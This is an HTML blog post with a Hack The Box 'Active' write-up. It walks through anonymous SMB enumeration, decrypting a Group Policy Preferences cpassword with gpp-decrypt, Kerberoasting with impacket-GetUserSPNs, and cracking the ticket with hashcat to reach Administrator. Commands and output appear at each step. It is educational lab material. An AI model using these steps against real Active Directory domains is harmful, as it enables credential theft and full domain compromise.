@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>Hack The Box: Active · blackhawk0x</title>
+  <meta name="description" content="HTB Active — Write-up
+
+">
+  <link rel="icon" href="data:,">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blackhawk0x" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box: Active | blackhawk0x</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Hack The Box: Active" />
+<meta name="author" content="blackhawk0x" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="HTB Active — Write-up" />
+<meta property="og:description" content="HTB Active — Write-up" />
+<link rel="canonical" href="http://localhost:4000/posts/active/" />
+<meta property="og:url" content="http://localhost:4000/posts/active/" />
+<meta property="og:site_name" content="blackhawk0x" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-10-22T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box: Active" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"blackhawk0x"},"dateModified":"2026-10-22T00:00:00+05:30","datePublished":"2026-10-22T00:00:00+05:30","description":"HTB Active — Write-up","headline":"Hack The Box: Active","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/active/"},"url":"http://localhost:4000/posts/active/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <header class="site-head">
+    <div class="site-head__inner shell">
+      <a href="/" class="wordmark">blackhawk<span class="dot">0x</span></a>
+      <nav class="nav">
+        <a href="/tags/" class="nav__link">topics</a>
+        <a href="/about/" class="nav__link">about</a>
+        <a href="/htb/" class="nav__link">htb</a>
+	<a href="/feed.xml" class="nav__link">rss</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="shell">
+    <article>
+  <header class="post-head">
+    <h1 class="post-title">Hack The Box: Active</h1>
+    <p class="post-meta">
+      2026.10.22
+      
+        &nbsp;·&nbsp;
+        <a class="row__tag" href="/tags/#active-directory">Active Directory</a>, <a class="row__tag" href="/tags/#kerberoasting">kerberoasting</a>, <a class="row__tag" href="/tags/#smb-enumeration">SMB Enumeration</a>, <a class="row__tag" href="/tags/#gpp">GPP</a>
+      
+    </p>
+  </header>
+  <div class="post-content">
+    <h1 id="htb-active--write-up">HTB Active — Write-up</h1>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.52</code><br />
+<strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">active.htb</code><br />
+<strong>Operating System:</strong> Windows Server 2008 R2 SP1<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Attack Path:</strong> SMB Enumeration → Group Policy Preferences (GPP) Password Disclosure → Service Account Access → Kerberoasting → Administrator Password Recovery</p>
+
+<hr />
+
+<h2 id="1-port-scanning-and-enumeration">1. Port Scanning and Enumeration</h2>
+
+<p>Start with an Nmap scan to identify open ports, running services, and the target’s likely role.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV 10.129.8.52 --min-rate 1000
+</code></pre></div></div>
+
+<h3 id="important-findings">Important findings</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Significance</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td>Domain name resolution</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td>Kerberos</td>
+      <td>Active Directory authentication</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Windows RPC services</td>
+    </tr>
+    <tr>
+      <td>139, 445</td>
+      <td>NetBIOS/SMB</td>
+      <td>File shares and domain resources</td>
+    </tr>
+    <tr>
+      <td>389</td>
+      <td>LDAP</td>
+      <td>Active Directory directory queries</td>
+    </tr>
+    <tr>
+      <td>464</td>
+      <td>Kerberos password service</td>
+      <td>Password change operations</td>
+    </tr>
+    <tr>
+      <td>3268</td>
+      <td>Global Catalog</td>
+      <td>Forest-wide directory queries</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The LDAP service identifies the domain as <code class="language-plaintext highlighter-rouge">active.htb</code>, and the server hostname is <code class="language-plaintext highlighter-rouge">DC</code>. The combination of DNS, Kerberos, LDAP, and SMB strongly suggests that this machine is an Active Directory domain controller.</p>
+
+<p>SMB signing is enabled and required. This is useful to record, although it does not prevent the credential-disclosure and Kerberoasting techniques used in this attack.</p>
+
+<h2 id="2-enumerating-smb-shares">2. Enumerating SMB Shares</h2>
+
+<p>Attempt anonymous share enumeration:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N -L '//10.129.8.52/'
+</code></pre></div></div>
+
+<p>The server permits anonymous authentication and reveals these shares:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sharename       Type
+---------       ----
+ADMIN$          Disk
+C$              Disk
+IPC$            IPC
+NETLOGON        Disk
+Replication     Disk
+SYSVOL          Disk
+Users           Disk
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Replication</code> share is particularly interesting because it may contain replicated domain files or configuration data. <code class="language-plaintext highlighter-rouge">SYSVOL</code> is also important because domain controllers store Group Policy objects and logon scripts there.</p>
+
+<h3 id="inspect-the-replication-share">Inspect the Replication share</h3>
+
+<p>Connect without credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N '//10.129.8.52/Replication'
+</code></pre></div></div>
+
+<p>Enumerate the directory structure and navigate to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>active.htb/Policies/
+</code></pre></div></div>
+
+<p>Inside a Group Policy object’s directory, inspect:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{31B2F340-016D-11D2-945F-00C04FB984F9}/
+    MACHINE/
+        Preferences/
+            Groups/
+                Groups.xml
+</code></pre></div></div>
+
+<p>The GUID shown here is the default domain policy’s well-known GUID.</p>
+
+<p>Retrieve the file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get Groups.xml
+</code></pre></div></div>
+
+<h2 id="3-extracting-the-gpp-password">3. Extracting the GPP Password</h2>
+
+<p>Inspect the downloaded XML:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat Groups.xml
+</code></pre></div></div>
+
+<p>The relevant entry contains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;User name="active.htb\SVC_TGS" ...&gt;
+    &lt;Properties
+        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+        userName="active.htb\SVC_TGS"/&gt;
+&lt;/User&gt;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">cpassword</code> attribute contains an encrypted password associated with a Group Policy Preferences account configuration.</p>
+
+<p>Historically, Group Policy Preferences could store passwords encrypted with a publicly documented AES key. Microsoft later addressed this insecure design, but old XML files can remain readable if they have not been removed.</p>
+
+<h3 id="decrypt-the-password">Decrypt the password</h3>
+
+<p>Use Impacket’s <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> utility:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+</code></pre></div></div>
+
+<p>Output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p>We now have credentials for:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: active.htb\SVC_TGS
+Password: GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p><strong>Key lesson:</strong> This is not a password-cracking attack. The weakness is recoverable password storage in Group Policy Preferences.</p>
+
+<h2 id="4-accessing-the-users-share">4. Accessing the Users Share</h2>
+
+<p>Authenticate to the <code class="language-plaintext highlighter-rouge">Users</code> share using the recovered credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient '//10.129.8.52/Users' --user active.htb/svc_tgs
+</code></pre></div></div>
+
+<p>Enter the recovered password when prompted.</p>
+
+<p>List the share contents:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
+</code></pre></div></div>
+
+<p>The listing includes directories such as:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator/
+All Users/
+Default/
+Default User/
+Public/
+SVC_TGS/
+</code></pre></div></div>
+
+<p>Navigate to the service account’s Desktop:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd SVC_TGS
+cd Desktop
+ls
+</code></pre></div></div>
+
+<p>Download the user flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get user.txt
+</code></pre></div></div>
+
+<p>This confirms that the recovered service-account credentials provide access to the share and allow retrieval of the user flag.</p>
+
+<p><strong>Important distinction:</strong> Access to a share and possession of a user’s Windows logon session are not necessarily the same thing. SMB share permissions determine which files can be accessed; they do not automatically establish interactive access to the host.</p>
+
+<h2 id="5-enumerating-kerberoastable-accounts">5. Enumerating Kerberoastable Accounts</h2>
+
+<p>With valid domain credentials, enumerate accounts with Service Principal Names (SPNs) and request their service tickets:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs active.htb/svc_tgs -request
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-10-22 11:28:56.155407             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$&lt;RDACTED&gt;
+</code></pre></div></div>
+
+<p>The account is also listed as a member of <code class="language-plaintext highlighter-rouge">Group Policy Creator Owners</code>.</p>
+
+<h3 id="why-is-this-interesting">Why is this interesting?</h3>
+
+<p>Kerberos uses Service Principal Names to associate services with accounts. A domain user with sufficient permissions can request a ticket for an SPN without knowing the target account’s password.</p>
+
+<p>When the service runs under a user account, the returned TGS ticket contains encrypted data derived from that account’s secret. An attacker can save the ticket and attempt to crack it offline.</p>
+
+<p>In this case, the SPN belongs to <code class="language-plaintext highlighter-rouge">Administrator</code>, making the ticket especially valuable.</p>
+
+<h2 id="6-cracking-the-administrators-kerberos-ticket">6. Cracking the Administrator’s Kerberos Ticket</h2>
+
+<p>Run Hashcat against the RockYou wordlist:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$&lt;REDACTED&gt;:&lt;PASSWORD&gt;
+</code></pre></div></div>
+
+<p>This demonstrates <strong>Kerberoasting</strong>: requesting a service ticket using valid domain credentials and attempting to recover the service account’s password offline.</p>
+
+<p>The attack is possible because the ticket can be requested legitimately, while password guesses are tested locally rather than sent repeatedly to the domain controller.</p>
+
+<h2 id="7-authenticate-as-administrator">7. Authenticate as Administrator</h2>
+
+<p>Test the recovered credentials against the SMB Users share:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient '//10.129.8.52/Users' --user active.htb/Administrator
+Password for [ACTIVE.HTB\Administrator]:
+Try "help" to get a list of possible commands.
+
+smb: \&gt; cd Administrator
+
+smb: \Administrator\&gt; cd Desktop
+
+smb: \Administrator\Desktop\&gt; get root.txt
+
+getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous SMB enumeration
+        |
+        v
+Discover Replication share
+        |
+        v
+Read Groups.xml in SYSVOL-style policy structure
+        |
+        v
+Decrypt GPP cpassword
+        |
+        v
+Recover SVC_TGS credentials
+        |
+        v
+Access Users share and retrieve user.txt
+        |
+        v
+Enumerate SPNs with GetUserSPNs
+        |
+        v
+Request Administrator's TGS ticket
+        |
+        v
+Crack ticket offline with Hashcat
+        |
+        v
+Recover Administrator password
+        |
+        v
+Authenticate to SMB as Administrator
+        |
+        v
+Retrieve root.txt
+</code></pre></div></div>
+
+
+  </div>
+</article>
+
+  </main>
+
+  <footer class="foot">
+    <div class="foot__inner shell">
+      <div class="foot__bar">
+        <p class="foot__id">
+          <span class="foot__brand">blackhawk0x</span>
+          <span class="foot__role">Ctf player</span>
+        </p>
+        <div class="foot__navs">
+          <nav class="foot__group" aria-label="site">
+            <a class="foot__link" href="/">writeups</a>
+            <span class="foot__dot">·</span><a class="foot__link" href="/tags/">topics</a>
+            <span class="foot__dot">·</span><a class="foot__link" href="/about/">about</a>
+          </nav>
+          <nav class="foot__group" aria-label="elsewhere">
+            <a class="foot__link" href="https://github.com/blackhawk0x" rel="me noopener">github</a>
+            
+            <span class="foot__dot">·</span><a class="foot__link" href="mailto:your_email@example.com">email</a>
+          </nav>
+          <nav class="foot__group" aria-label="machine readable">
+            <a class="foot__link" href="/feed.xml">rss</a>
+            <span class="foot__dot">·</span><a class="foot__link" href="/sitemap.xml">sitemap</a>
+          </nav>
+        </div>
+      </div>
+      <p class="foot__colophon">
+        <span>&copy; 2026 blackhawk0x</span>
+        <span class="foot__dot">·</span>
+        <span>no tracker</span>
+      </p>
+    </div>
+  </footer>
+</body>
+</html>
